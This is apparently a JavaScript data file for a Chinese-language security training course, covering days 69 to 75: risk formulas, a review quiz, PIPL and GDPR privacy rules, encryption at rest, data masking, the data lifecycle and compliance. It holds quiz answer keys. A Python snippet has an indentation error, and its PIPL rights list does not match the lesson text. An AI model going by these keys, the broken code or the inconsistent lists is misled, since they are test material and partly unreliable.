  codeExample:{language:'python',code:'print(\"=== 安全风险评估计算 ===\\n\")\n\n# 风险评估公式\nclass RiskCalculator:\n    @staticmethod\n    def ale(sle, aro):\n        \"\"\"年度预期损失 = 单次损失期望 × 年发生率\"\"\"\n        return sle * aro\n    \n    @staticmethod\n    def sle(av, ef):\n        \"\"\"单次损失期望 = 资产价值 × 暴露因子\"\"\"\n        return av * ef\n\n# 示例: 数据泄露风险评估\nav = 5000000  # 资产价值 500万\n ef = 0.3      # 暴露因子 30%\naro = 0.25     # 年发生率 0.25次/年\n\nsingle_loss = RiskCalculator.sle(av, ef)\nyearly_loss = RiskCalculator.ale(single_loss, aro)\n\nprint(f\"资产价值(AV): ¥{av:,}\")\nprint(f\"暴露因子(EF): {ef*100}%\")\nprint(f\"年发生率(ARO): {aro}次/年\")\nprint(f\"\\nSLE = AV×EF = ¥{single_loss:,}\")\nprint(f\"ALE = SLE×ARO = ¥{yearly_loss:,}\")',description:'风险计算演示'},
  quiz:[{"id":"q69-1","question":"PTES渗透测试标准第一步？","options":["漏洞利用", "前期交互(Pre-engagement)", "扫描", "报告"],"correctIndex":1,"explanation":"PTES第一步=签署协议确定范围。"},{"id":"q69-2","question":"Nessus是什么类型工具？","options":["WAF", "漏洞扫描器", "防火墙", "IDS"],"correctIndex":1,"explanation":"Nessus=漏洞扫描器。"},{"id":"q69-3","question":"Fuzzing(模糊测试)指？","options":["精确测试", "发送大量随机/畸形数据发现崩溃/漏洞", "单元测试", "性能测试"],"correctIndex":1,"explanation":"Fuzzing=随机大量输入诱发异常。"},{"id":"q69-4","question":"黑盒渗透测试特点？","options":["有源码", "无内部信息,模拟外部攻击者视角", "有架构文档", "有管理员协助"],"correctIndex":1,"explanation":"黑盒=零信息,模拟真实外部攻击。"},{"id":"q69-5","question":"渗透测试报告应包含？","options":["仅漏洞列表", "发现+风险评级+修复建议+复现步骤", "仅评分", "仅截图"],"correctIndex":1,"explanation":"报告=发现→影响→修复→复现。"}],
  recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[69]||[],
});
allDays.push({
  id:'day-70',day:70,week:10,title:'十周总结与测验（安全工程）',
  objectives:['知识地图','核心公式与数字','模拟测验（10题）'],
  content:`# Day 70：第十周总结与测验
\`\`\`
安全工程知识体系：
  Day 64 — 风险评估 (SLE/ALE/NIST SP 800-30)
  Day 65 — 威胁建模 (STRIDE/攻击树/DFD)
  Day 66 — 安全架构 (纵深防御/零信任/八原则)
  Day 67 — 安全SDLC (SDL/SAMM/SAST/DAST)
  Day 68 — 代码审计 (Source→Sink追踪)
\`\`\`
---
## 二、核心公式与数字
\`\`\`
SLE = AV × EF (单一损失期望 = 资产价值 × 暴露因子)
ALE = SLE × ARO (年度损失期望 = SLE × 年度发生率)
Risk = Threat × Vulnerability × Asset
STRIDE = 6类威胁 (Spoofing/Tampering/Repudiation/Info/DoS/Elevation)
八原则：最小权限、默认拒绝、纵深防御、安全默认值、
         失败安全、经济性机制、最小公共化、开放设计
\`\`\`
---
**1. 单一损失期望(SLE)的计算公式是？**
A. AV + EF  B. AV × EF  C. AV − EF  D. SLE不涉及AV
<details><summary>答案</summary>**B** — SLE = 资产价值(AV) × 暴露因子(EF)。</details>
---
**2. STRIDE中的"E"代表什么？**
A. Encryption  B. Elevation of Privilege  C. Error  D. External
<details><summary>答案</summary>**B** — Elevation of Privilege(权限提升)。</details>
---
**3. 安全设计八原则中，"失败安全"的含义是？**
A. 系统永不失败  B. 出错时倾向于拒绝而非放行  C. 不做错误处理  D. 记录错误日志
<details><summary>答案</summary>**B** — 失败安全原则要求在出错时倾向于安全状态（拒绝访问）。</details>
---
**4. SAST属于什么类型的测试？**
A. 黑盒动态测试  B. 白盒静态分析  C. 渗透测试  D. 模糊测试
<details><summary>答案</summary>**B** — SAST是静态分析，不运行代码。</details>
---
**5. 攻击树中AND节点表示什么？**
A. 任一子目标即可  B. 所有子目标都必须完成  C. 不是攻击路径  D. 最优路径
<details><summary>答案</summary>**B** — AND节点要求所有子目标都完成才能达到父目标。</details>
---
**6-10. 判断题**
**6. Kerckhoffs原理主张安全应依赖算法保密性。** ❌ （依赖密钥保密，不依赖算法保密）
**7. 纵深防御是最好的安全架构策略。** ✅
**8. 滥用案例是从攻击者视角描述系统可能被如何攻击。** ✅
**9. IAST需要运行应用进行测试。** ✅
**10. 代码审计中Source是漏洞被触发的位置。** ❌ （Source是不受信任的输入源，Sink才是危险操作位置）
---
## 四、学习进度
\`\`\`
✅ Week 1-10 完成  ████████████████ 70/84 (83%)
⬜ Week 11-12  待  ░░ 14/84 剩余
\`\`\`
---
> **下一步**：Day 71 隐私保护——数据隐私法规与保护技术。`,
  codeExample:{language:'python',code:'print(\"=== 安全风险评估计算 ===\\n\")\n\n# 风险评估公式\nclass RiskCalculator:\n    @staticmethod\n    def ale(sle, aro):\n        \"\"\"年度预期损失 = 单次损失期望 × 年发生率\"\"\"\n        return sle * aro\n    \n    @staticmethod\n    def sle(av, ef):\n        \"\"\"单次损失期望 = 资产价值 × 暴露因子\"\"\"\n        return av * ef\n\n# 示例: 数据泄露风险评估\nav = 5000000  # 资产价值 500万\n ef = 0.3      # 暴露因子 30%\naro = 0.25     # 年发生率 0.25次/年\n\nsingle_loss = RiskCalculator.sle(av, ef)\nyearly_loss = RiskCalculator.ale(single_loss, aro)\n\nprint(f\"资产价值(AV): ¥{av:,}\")\nprint(f\"暴露因子(EF): {ef*100}%\")\nprint(f\"年发生率(ARO): {aro}次/年\")\nprint(f\"\\nSLE = AV×EF = ¥{single_loss:,}\")\nprint(f\"ALE = SLE×ARO = ¥{yearly_loss:,}\")',description:'风险计算演示'},
  quiz:[{"id":"q70-1","question":"ALE=SLE×ARO中ARO代表？","options":["Average Recovery", "Annualized Rate of Occurrence(年发生率)", "Asset Risk", "Area Recovery"],"correctIndex":1,"explanation":"ARO=一年发生多少次。"},{"id":"q70-2","question":"STRIDE的六个字母分别代表？","options":["Spoofing/Tampering/Repudiation/InfoDisc/DoS/Elevation", "不同的安全产品", "六种加密算法", "六层网络"],"correctIndex":0,"explanation":"STRIDE六类威胁。"},{"id":"q70-3","question":"SDL最终阶段？","options":["设计", "响应(Response)", "测试", "部署"],"correctIndex":1,"explanation":"SDL=培训→需求→设计→实现→验证→发布→响应。"},{"id":"q70-4","question":"安全评估定性和定量的区别？","options":["无区别", "定性=等级描述 | 定量=数值/金额计算", "定性更准确", "定量不需要数据"],"correctIndex":1,"explanation":"定性vs定量=描述vs数值。"},{"id":"q70-5","question":"渗透测试PTES中漏洞利用在？","options":["第一步", "信息收集之后(第五阶段)", "报告之后", "无此阶段"],"correctIndex":1,"explanation":"PTES=交互→收集→威胁建模→漏洞分析→利用→后利用→报告。"}],
  recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[70]||[],
});
allDays.push({
  id:'day-71',day:71,week:11,title:'隐私保护（业务安全）',
  objectives:['隐私保护框架','中国个人信息保护法(PIPL)','全球隐私法规对比'],
  content:`# Day 71：隐私保护
## 一、隐私保护框架
### 1.1 隐私保护原则
\`\`\`
信息生命周期中的隐私保护：
  收集 → 目的明确、最小必要、知情同意
  存储 → 最小化保留、安全存储
  使用 → 用途限制、去标识化
  共享 → 授权共享、跨境管控
  销毁 → 安全删除、不可恢复
\`\`\`
### 1.2 个人信息分类
\`\`\`
个人信息 (PII)：
  姓名、身份证号、手机号、邮箱、地址、IP地址、Cookie
敏感个人信息：
  身份证号、生物识别信息、宗教信仰、医疗健康、金融账户、
  行踪轨迹、不满14周岁未成年人的个人信息
处理敏感个人信息：
  ⚠️ 需要单独同意 + 特定目的 + 充分必要性
\`\`\`
---
## 二、中国个人信息保护法(PIPL)
### 2.1 个人信息主体权利
\`\`\`
PIPL赋予的七项权利：
① 知情权权：知道谁在处理、怎么处理你的信息
② 决定权权：控制是否允许处理
③ 限制权权：限制或拒绝处理
④ 查阅复制权：查看和获取自己的个人信息
⑤ 更正权：要求更正不准确信息
⑥ 删除权：要求删除("被遗忘权")
⑦ 可携带权：将个人信息转移到其他平台
\`\`\`
### 2.2 跨境数据转移
\`\`\`
数据出境安全评估条件：
  · 向境外提供个人信息 → 需通过安全评估
  · 关键信息基础设施运营者 → 境内存储
  · 处理100万人以上个人信息 → 安全评估
  · 累计向境外提供10万人以上或1万人以上敏感信息 → 安全评估
出境机制（三选一）：
  ① 通过国家网信部门安全评估
  ② 经专业机构个人信息保护认证
  ③ 签订标准合同(备案)
\`\`\`
---
## 三、全球隐私法规对比
| 法规 | 地区 | 核心特点 |
|------|------|---------|
| PIPL | 中国 | 严格的数据出境管控 + 行政罚款最高5千万或年收入5% |
| GDPR | 欧盟 | 数据主体权利最全面 + 罚款最高年收入4% |
| CCPA/CPRA | 加州 | 消费者opt-out权 + 出售数据披露 |
| LGPD | 巴西 | 类似GDPR框架 |
---
## 四、隐私保护技术(PET)
\`\`\`
常用隐私增强技术：
① 数据脱敏 (Data Masking)
   静态脱敏：测试环境
   动态脱敏：生产环境实时遮盖
② 匿名化 (Anonymization)
   k-匿名(k-Anonymity)：任一个体至少与k-1个其他个体不可区分
   差分隐私(Differential Privacy)：加噪保护个体统计信息
③ 同态加密 (Homomorphic Encryption)
   加密数据上直接计算
④ 联邦学习 (Federated Learning)
   数据不动模型动，保护原始数据不出域
\`\`\`
---
## 五、隐私影响评估(PIA)
\`\`\`
PIA触发条件（PIPL第55条）：
  · 处理敏感个人信息
  · 利用个人信息进行自动化决策
  · 委托处理/提供/公开个人信息
  · 向境外提供个人信息
  · 其他对个人权益有重大影响
PIA报告内容：
  ① 处理目的和方式`,
  codeExample:{language:'python',code:'print(\"=== 数据安全与隐私保护 ===\\n\")\n\n# PIPL七权利\nrights = [\"知情权\", \"查阅权\", \"更正权\", \"删除权\", \"限制处理权\", \"可携带权\", \"反对权\"]\nprint(\"PIPL七大权利:\")\nfor i, r in enumerate(rights, 1):\n    print(f\"  {i}. {r}\")\n\n# 数据分类\nlevels = [(\"公开\", \"无限制\"), (\"内部\", \"员工可访问\"), (\"机密\", \"授权访问\"), (\"绝密\", \"严格限制\")]\nprint(\"\\n数据分类分级:\")\nfor name, desc in levels:\n    print(f\"  [{name}] {desc}\")\n\n# 加密四层\nlayers = [\"应用层加密\", \"数据库加密(TDE)\", \"文件系统加密\", \"全盘加密(FDE)\"]\nprint(\"\\n加密四层架构:\")\nfor i, l in enumerate(layers, 1):\n    print(f\"  L{i}: {l}\")',description:'业务安全与数据隐私'},
  quiz:[{"id":"q71-1","question":"PIPL全称？","options":["Public Internet Protocol", "个人信息保护法", "Private IP List", "Public Information Law"],"correctIndex":1,"explanation":"中华人民共和国个人信息保护法。"},{"id":"q71-2","question":"PbD七原则不包括？","options":["主动而非被动", "隐私作为默认设置", "追求利润最大化", "端到端安全"],"correctIndex":2,"explanation":"PbD=Privacy by Design七大原则。"},{"id":"q71-3","question":"PIA全称？","options":["Public Information Access", "隐私影响评估(Privacy Impact Assessment)", "Private Internet Access", "Personal ID Access"],"correctIndex":1,"explanation":"PIA评估处理活动对隐私的影响。"},{"id":"q71-4","question":"GDPR最高罚款？","options":["100万欧", "2000万欧元或全球年营收4%(取高)", "1000万欧", "500万欧"],"correctIndex":1,"explanation":"GDPR罚款上限极高。"},{"id":"q71-5","question":"PET隐私增强技术不包括？","options":["差分隐私", "同态加密", "数据倾销", "安全多方计算"],"correctIndex":2,"explanation":"PET=差分隐私/同态加密/安全多方等。"}],
  recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[71]||[],
});
allDays.push({
  id:'day-72',day:72,week:11,title:'数据加密存储（业务安全）',
  objectives:['数据加密层次模型','全盘加密(FDE)','文件/数据库加密'],
  content:`# Day 72：数据加密存储
## 一、数据加密层次模型
\`\`\`
数据加密五层模型：
  ┌─────────────────────────────────┐
  │  应用层加密 (App-Level)          │ ← 最灵活，代码控制
  ├─────────────────────────────────┤
  │  数据库加密 (DB-Level / TDE)     │ ← 对应用透明
  ├─────────────────────────────────┤
  │  文件系统加密 (FS-Level / eCryptfs)│
  ├─────────────────────────────────┤
  │  块设备加密 (LUKS / BitLocker)   │
  ├─────────────────────────────────┤
  │  硬件加密 (SED / HSM)            │ ← 最底层，最高性能
  └─────────────────────────────────┘
每层保护不同攻击场景：
  磁盘被盗 → 全盘加密保护
  数据库泄露 → TDE保护
  应用层数据泄露 → 应用层加密保护
\`\`\`
---
## 二、全盘加密(FDE)
### 2.1 技术对比
| 技术 | 平台 | 特点 |
|------|------|------|
| BitLocker | Windows | TPM芯片绑定，透明加解密 |
| FileVault 2 | macOS | XTS-AES-128，恢复密钥管理 |
| LUKS/dm-crypt | Linux | 开放标准，灵活配置 |
| VeraCrypt | 跨平台 | 开源，隐匿卷功能 |
| SED (Self-Encrypting Drive) | 硬件 | 介质级加密，零性能损耗 |
### 2.2 关键安全注意事项
\`\`\`
⚠️ 预启动认证(Pre-Boot Authentication)必须启用
⚠️ 恢复密钥安全存储（打印存档或AD备份）
⚠️ 挂起/休眠状态 → 加密密钥在内存中 → 存在风险
⚠️ FDE只保护静态数据（磁盘被盗），不防运行中的攻击
\`\`\`
---
## 三、文件/数据库加密
### 3.1 TDE (透明数据加密)
\`\`\`
TDE (Transparent Data Encryption)：
工作原理：
  · 数据库自动加密写入磁盘的数据
  · 读取时自动解密
  · 对应用程序完全透明
保护范围：
  ✅ 数据文件和日志文件(磁盘文件)
  ✅ 备份文件
  ❌ 数据库连接中的传输数据(需要TLS)
  ❌ 运行中内存中的数据
数据库支持：
  SQL Server: TDE (AES-256)
  Oracle: TDE (AES-192/256)
  MySQL: InnoDB Tablespace Encryption
  PostgreSQL: 多种扩展支持
\`\`\`
---
## 四、应用层加密
### 4.1 何时使用
\`\`\`
应用层加密适用场景：
  · 需要跨平台/跨存储介质的加密保护
  · 多租户场景的数据隔离(每租户不同密钥)
  · 特定字段的独立加密(身份证号、银行卡号)
  · 合规要求(PCI DSS保护持卡人数据)
方案选择：
  ① 信封加密(Envelope Encryption)：
     DEK(数据加密密钥)加密数据 → KEK(密钥加密密钥)加密DEK
     AWS KMS / Azure Key Vault 实践
  ② 确定性加密：
     相同明文 → 相同密文
     → 支持加密数据的精确查找
     → 风险：频率分析攻击
\`\`\`
---
## 五、密钥管理服务(KMS)
\`\`\`
KMS核心能力：
  ✅ 密钥生成 (HSM内安全生成)`,
  codeExample:{language:'python',code:'print(\"=== 数据安全与隐私保护 ===\\n\")\n\n# PIPL七权利\nrights = [\"知情权\", \"查阅权\", \"更正权\", \"删除权\", \"限制处理权\", \"可携带权\", \"反对权\"]\nprint(\"PIPL七大权利:\")\nfor i, r in enumerate(rights, 1):\n    print(f\"  {i}. {r}\")\n\n# 数据分类\nlevels = [(\"公开\", \"无限制\"), (\"内部\", \"员工可访问\"), (\"机密\", \"授权访问\"), (\"绝密\", \"严格限制\")]\nprint(\"\\n数据分类分级:\")\nfor name, desc in levels:\n    print(f\"  [{name}] {desc}\")\n\n# 加密四层\nlayers = [\"应用层加密\", \"数据库加密(TDE)\", \"文件系统加密\", \"全盘加密(FDE)\"]\nprint(\"\\n加密四层架构:\")\nfor i, l in enumerate(layers, 1):\n    print(f\"  L{i}: {l}\")',description:'业务安全与数据隐私'},
  quiz:[{"id":"q72-1","question":"TDE(透明数据加密)工作在哪层？","options":["应用层", "数据库层(对应用透明)", "文件系统层", "磁盘层"],"correctIndex":1,"explanation":"TDE=数据库自动加密,应用无感知。"},{"id":"q72-2","question":"BitLocker是什么？","options":["数据库加密", "Windows全盘加密(FDE)", "网络加密", "应用加密"],"correctIndex":1,"explanation":"BitLocker=Windows全磁盘加密。"},{"id":"q72-3","question":"HSM在加密存储中的角色？","options":["不参与", "安全生成/存储/使用密钥", "仅加速", "仅日志"],"correctIndex":1,"explanation":"HSM=密钥不被导出,所有操作在硬件内。"},{"id":"q72-4","question":"KMS(密钥管理系统)核心功能？","options":["加密数据", "密钥全生命周期管理(生成/轮换/销毁)", "仅存储", "备份"],"correctIndex":1,"explanation":"KMS=密钥生成→分发→轮换→撤销→销毁。"},{"id":"q72-5","question":"应用层加密的优势？","options":["最简单", "端到端保护,数据库管理员也看不到明文", "最快", "不需要密钥"],"correctIndex":1,"explanation":"应用层加密=数据入数据库前已加密。"}],
  recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[72]||[],
});
allDays.push({
  id:'day-73',day:73,week:11,title:'数据脱敏（业务安全）',
  objectives:['脱敏基础概念','脱敏算法详解','静态脱敏(SDM)'],
  content:`# Day 73：数据脱敏
## 一、脱敏基础概念
\`\`\`
数据脱敏 = 用看起来真实但实际上是伪造的数据替换真实数据
脱敏 vs 加密：
  加密 → 保护机密性，可解密恢复
  脱敏 → 永久或临时替换，可能不可逆
适用场景：
  开发测试：用脱敏数据替代生产数据
  数据分析：脱敏后给分析师使用
  展示掩码：前端只显示部分信息
  培训演示：真实格式但假数据
\`\`\`
---
## 二、脱敏算法详解
### 2.1 常用算法
| 算法 | 方法 | 示例 | 可逆性 |
|------|------|------|--------|
| **掩码(Masking)** | 部分字符替换 | 138****1234 | ❌ 不可逆 |
| **替换(Substitution)** | 真实值→假值 | 张三→李四(查表) | ⚠️ 查表可逆 |
| **随机化** | 随机值替换 | 3500→4823 | ❌ 不可逆 |
| **伪随机** | 可复现的随机 | 张三→MxTp(同输入同输出) | ⚠️ 算法可逆 |
| **泛化(Generalization)** | 范围替代 | 35岁→30-40岁 | ❌ 不可逆 |
| **哈希** | 单向哈希 | sha256(张三) | ❌ 不可逆 |
| **保留格式加密(FPE)** | 加密但保持格式 | 6222****1234→6222****5678 | ✅ 可解密 |
### 2.2 FPE (格式保留加密)
\`\`\`
保留格式加密：加密后保持原有数据格式
场景：信用卡号脱敏
  6222 1234 5678 9012 → 6222 9876 5432 1098
  · 仍是16位数字
  · 通过Luhn校验
  · 前6位(BIN)可保留
  · 安全和业务兼容的完美平衡
\`\`\`
---
## 三、静态脱敏(SDM)
\`\`\`
SDM (Static Data Masking)：
  从生产库导出 → 脱敏处理 → 写入目标库
适用：
  · 开发/测试环境
  · 数据共享给第三方
  · 一次性导出
流程：
  生产DB → 导出脚本 → 脱敏引擎 → 目标DB
         → 需确保脱敏规则覆盖所有敏感列
         → 需要刷新策略（定期重脱敏）
\`\`\`
---
## 四、动态脱敏(DDM)
\`\`\`
DDM (Dynamic Data Masking)：
  实时拦截SQL查询 → 改写查询 → 返回脱敏结果
适用：
  · 生产环境外包运维（运维人员看到脱敏数据）
  · 不同用户看到不同数据粒度
  · 实时数据访问控制
数据库支持：
  SQL Server: Dynamic Data Masking
  Oracle: Data Redaction
示例：
  原始数据：SELECT phone FROM users; → 13812345678
  HR角色：  返回 13812345678 (完整)
  客服角色：返回 138****5678 (掩码)
\`\`\`
---
| 考点 | 记忆要点 |
|------|---------|
| 脱敏 vs 加密 | "加密可解密，脱敏可能不可逆" |
| SDM vs DDM | "SDM静态(导出脱敏)，DDM动态(实时掩盖)" |
| FPE | "加密后保持原格式" |
| 掩码示例 | "138****1234" |
---
- [ ] 脱敏和加密的区别？
- [ ] 至少5种脱敏算法？
- [ ] SDM和DDM的应用场景？
- [ ] FPE的适用场景和价值？
- [ ] 动态脱敏如何做到不同角色不同数据？
---`,
  codeExample:{language:'python',code:'print(\"=== 数据安全与隐私保护 ===\\n\")\n\n# PIPL七权利\nrights = [\"知情权\", \"查阅权\", \"更正权\", \"删除权\", \"限制处理权\", \"可携带权\", \"反对权\"]\nprint(\"PIPL七大权利:\")\nfor i, r in enumerate(rights, 1):\n    print(f\"  {i}. {r}\")\n\n# 数据分类\nlevels = [(\"公开\", \"无限制\"), (\"内部\", \"员工可访问\"), (\"机密\", \"授权访问\"), (\"绝密\", \"严格限制\")]\nprint(\"\\n数据分类分级:\")\nfor name, desc in levels:\n    print(f\"  [{name}] {desc}\")\n\n# 加密四层\nlayers = [\"应用层加密\", \"数据库加密(TDE)\", \"文件系统加密\", \"全盘加密(FDE)\"]\nprint(\"\\n加密四层架构:\")\nfor i, l in enumerate(layers, 1):\n    print(f\"  L{i}: {l}\")',description:'业务安全与数据隐私'},
  quiz:[{"id":"q73-1","question":"数据掩码(Masking)的典型场景？","options":["生产环境", "非生产环境(开发/测试)保护真实数据", "公网", "备份"],"correctIndex":1,"explanation":"掩码=测试环境用伪数据代替真数据。"},{"id":"q73-2","question":"静态脱敏(SDM)处理什么数据？","options":["实时数据", "存储中数据(导出/备份时脱敏)", "传输中", "处理中"],"correctIndex":1,"explanation":"SDM=数据导出时脱敏,结果不可逆。"},{"id":"q73-3","question":"动态脱敏(DDM)特点？","options":["修改源数据", "实时查询时脱敏,源数据不变", "脱敏后不可还原", "仅用于备份"],"correctIndex":1,"explanation":"DDM=查询时动态替换敏感字段。"},{"id":"q73-4","question":"同态加密的优势？","options":["速度最快", "密文上直接计算,不用解密", "实现最简单", "不需要密钥"],"correctIndex":1,"explanation":"同态加密=加法/乘法同态。"},{"id":"q73-5","question":"令牌化(Tokenization)是什么？","options":["加密", "用随机Token替换敏感数据(无数学关系)", "删除数据", "压缩"],"correctIndex":1,"explanation":"Token化=替代值,不同于加密(可逆)。"}],
  recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[73]||[],
});
allDays.push({
  id:'day-74',day:74,week:11,title:'数据生命周期管理（业务安全）',
  objectives:['数据生命周期模型','数据分类分级','数据保留与销毁'],
  content:`# Day 74：数据生命周期管理
## 一、数据生命周期模型
\`\`\`
数据六阶段生命周期：
  创建/收集 → 存储 → 使用 → 共享 → 归档 → 销毁
每一阶段的安全控制：
  创建：分类标记、最小收集
  存储：加密、访问控制、备份
  使用：脱敏、权限验证、审计
  共享：传输加密、DLP、合同约束
  归档：长期保存、合规保留、异地存储
  销毁：安全擦除、物理销毁、销毁证明
\`\`\`
---
## 二、数据分类分级
### 2.1 分级模式
\`\`\`
中国政府数据安全法 — 数据分类分级：
  一般数据 → 基础保护
  重要数据 → 重点保护
  核心数据 → 最严格保护
企业常见分级(4级)：
  公开 → 对外可发布：公司新闻、产品介绍
  内部 → 员工可访问：内部文档、非敏感业务
  机密 → 限授权访问：客户数据、商业计划
  绝密 → 严格限制：核心知识产权、密钥材料
\`\`\`
### 2.2 数据标记方法
\`\`\`
标记方式：
  · 数字水印(明文/盲水印)
  · 元数据标记
  · 文件头标记
  · DLP自动识别+标记
标记内容：分级、所有者、创建日期、保留期限
\`\`\`
---
## 三、数据保留与销毁
### 3.1 保留政策
\`\`\`
数据保留：既要保存足够久(合规)，又不能太久(风险)
基于合规的保留：
  · 财务记录：一般5-10年
  · 医疗记录：不同地区5-30年
  · 劳动合同：终止后2年保存
  · 日志数据：根据安全需求(通常1年以上)
\`\`\`
### 3.2 安全销毁
| 介质 | 方法 | 标准 |
|------|------|------|
| 磁盘/SSD | 覆写(DoD 5220.22-M 3-pass) | NIST SP 800-88 |
| SSD | Secure Erase / 加密擦除 | ATA Security Erase |
| 磁带 | 消磁(Degauss) | NSA/CSS 9-12 |
| 纸张 | 碎纸(交叉粉碎) | DIN 66399 |
| 云存储 | 加密擦除(Crypto-Shredding) | 销毁加密密钥 |
> 加密擦除(Crypto-Shredding)：删除加密密钥 = 数据永久不可访问
---
## 四、数据治理框架
\`\`\`
数据治理三要素：
  ① 组织：数据治理委员会、数据所有者、数据管理员
  ② 流程：数据标准、数据质量、生命周期管理
  ③ 技术：数据目录、数据血缘、元数据管理
DLP (数据防泄露)：
  网络DLP：监控出站网络流量
  存储DLP：扫描存储中的敏感数据
  端点DLP：控制USB/外设/打印
\`\`\`
---
| 考点 | 记忆要点 |
|------|---------|
| 数据三分类 | "一般+重要+核心(数据安全法)" |
| 企业四分级 | "公开→内部→机密→绝密" |
| 安全销毁 | "覆写(HDD)+加密擦除(SSD)+消磁(磁带)+碎纸(纸)" |
| 加密擦除 | "Crypto-Shredding=删密钥=数据永久不可读" |
---
- [ ] 数据生命周期的六阶段？
- [ ] 中国数据分类分级的三级？
- [ ] 不同介质的销毁方法？
- [ ] 加密擦除的原理？`,
  codeExample:{language:'python',code:'print(\"=== 数据安全与隐私保护 ===\\n\")\n\n# PIPL七权利\nrights = [\"知情权\", \"查阅权\", \"更正权\", \"删除权\", \"限制处理权\", \"可携带权\", \"反对权\"]\nprint(\"PIPL七大权利:\")\nfor i, r in enumerate(rights, 1):\n    print(f\"  {i}. {r}\")\n\n# 数据分类\nlevels = [(\"公开\", \"无限制\"), (\"内部\", \"员工可访问\"), (\"机密\", \"授权访问\"), (\"绝密\", \"严格限制\")]\nprint(\"\\n数据分类分级:\")\nfor name, desc in levels:\n    print(f\"  [{name}] {desc}\")\n\n# 加密四层\nlayers = [\"应用层加密\", \"数据库加密(TDE)\", \"文件系统加密\", \"全盘加密(FDE)\"]\nprint(\"\\n加密四层架构:\")\nfor i, l in enumerate(layers, 1):\n    print(f\"  L{i}: {l}\")',description:'业务安全与数据隐私'},
  quiz:[{"id":"q74-1","question":"数据生命周期第一步？","options":["归档", "创建/采集", "销毁", "共享"],"correctIndex":1,"explanation":"Create→Store→Use→Share→Archive→Destroy。"},{"id":"q74-2","question":"数据分类最常见的三级？","options":["大/中/小", "公开/内部/机密(或绝密)", "快/中/慢", "A/B/C"],"correctIndex":1,"explanation":"数据分类=公开→内部→机密→绝密。"},{"id":"q74-3","question":"NIST SP 800-88是什么？","options":["加密标准", "介质清理(Sanitization)标准", "网络安全", "密码标准"],"correctIndex":1,"explanation":"800-88=清除/净化/销毁指南。"},{"id":"q74-4","question":"数据归档与备份的区别？","options":["无区别", "归档=长期保存;备份=灾难恢复", "归档更快", "备份更小"],"correctIndex":1,"explanation":"归档=合规保留;备份=恢复。"},{"id":"q74-5","question":"安全销毁(Crypto-shredding)指？","options":["物理销毁", "删除加密密钥使数据无法解密", "粉碎硬盘", "格式化"],"correctIndex":1,"explanation":"Crypto-shredding=销毁密钥=数据不可读。"}],
  recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[74]||[],
});
allDays.push({
  id:'day-75',day:75,week:11,title:'隐私合规实践（业务安全）',
  objectives:['隐私合规框架','知情同意机制','数据主体权利响应'],
  content:`# Day 75：隐私合规实践
## 一、隐私合规框架
\`\`\`
企业隐私合规建设要素：
  ① 组织：数据保护官(DPO) + 隐私委员会
  ② 制度：隐私政策 + 数据分类 + 保护规程
  ③ 技术：数据发现 + 脱敏 + 加密 + 审计
  ④ 流程：PIA + 数据主体请求 + 事件响应
  ⑤ 培训：全员隐私意识 + 专业人员认证
\`\`\`
---
## 二、知情同意机制
\`\`\`
有效同意的要素：
  ✅ 自愿 (Freely given)
  ✅ 具体 (Specific)
  ✅ 知情 (Informed)
  ✅ 明确 (Unambiguous)
  ✅ 可撤回 (Revocable)
禁止：
  ❌ 一揽子同意（不同意不能使用全部功能）
  ❌ 默认勾选（需要主动勾选）
  ❌ 拒绝服务（不同意就拒绝基本服务）
  ❌ 捆绑同意（与无关目的捆绑要求同意）
\`\`\`
---
## 三、数据主体权利响应
\`\`\`
DSAR (数据主体访问请求) 处理流程：
  接收请求 → 身份验证 → 数据查询(各系统) → 
  数据整理 → 脱敏处理 → 格式转换 → 安全交付
时限要求：
  PIPL: 及时响应
  GDPR: 1个月内(可再延长2个月)
拒绝请求的理由（限特定情况）：
  · 明显无根据或过度
  · 涉及他人隐私
  · 法律禁止披露
\`\`\`
---
## 四、隐私合规审计
\`\`\`
审计要点：
□ 隐私政策是否最新且易获取？
□ 个人信息清单是否完整？
□ 同意记录是否可追溯？
□ 数据出境地是否合规？
□ 第三方处理者是否有合同？
□ PIA是否在必要时执行？
□ 数据主体请求通道是否畅通？
□ 安全事件发现到通知是否在72h内？
□ 员工隐私培训记录？
\`\`\`
---
| 考点 | 记忆要点 |
|------|---------|
| 知情同意要素 | "自愿+具体+知情+明确+可撤回" |
| DSAR时限 | "GDPR 1个月，PIPL及时响应" |
| DPO | "数据保护官，合规负责人" |
---
- [ ] 有效同意的五个要素？
- [ ] DSAR处理的标准流程？
- [ ] 隐私合规审计的核心检查项？
- [ ] 拒绝DSAR的合法理由？
---
> **下一步**：Day 76 数据治理体系。`,
  codeExample:{language:'python',code:'print(\"=== 数据安全与隐私保护 ===\\n\")\n\n# PIPL七权利\nrights = [\"知情权\", \"查阅权\", \"更正权\", \"删除权\", \"限制处理权\", \"可携带权\", \"反对权\"]\nprint(\"PIPL七大权利:\")\nfor i, r in enumerate(rights, 1):\n    print(f\"  {i}. {r}\")\n\n# 数据分类\nlevels = [(\"公开\", \"无限制\"), (\"内部\", \"员工可访问\"), (\"机密\", \"授权访问\"), (\"绝密\", \"严格限制\")]\nprint(\"\\n数据分类分级:\")\nfor name, desc in levels:\n    print(f\"  [{name}] {desc}\")\n\n# 加密四层\nlayers = [\"应用层加密\", \"数据库加密(TDE)\", \"文件系统加密\", \"全盘加密(FDE)\"]\nprint(\"\\n加密四层架构:\")\nfor i, l in enumerate(layers, 1):\n    print(f\"  L{i}: {l}\")',description:'业务安全与数据隐私'},
